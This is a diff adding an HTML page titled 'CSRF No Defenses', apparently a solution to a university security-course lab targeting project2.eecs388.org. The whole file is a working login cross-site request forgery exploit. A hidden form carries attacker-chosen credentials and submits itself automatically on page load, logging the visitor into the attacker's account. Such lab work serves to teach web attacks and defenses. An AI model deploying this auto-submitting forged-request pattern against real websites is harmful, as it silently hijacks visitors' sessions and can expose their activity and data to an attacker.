@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='utf-8'>
+    <title>CSRF No Defenses</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+</head>
+    <body hidden>
+        <form action="https://project2.eecs388.org/login?csrfdefense=0&xssdefense=4" method="POST">
+            <input id="username" name="username" value="attacker">
+            <input id="userpass" name="password" value="l33th4x">
+        </form>
+    </body>
+    <script>
+        window.onload = function(){
+            document.forms[0].submit();
+        }
+    </script>
+</html>
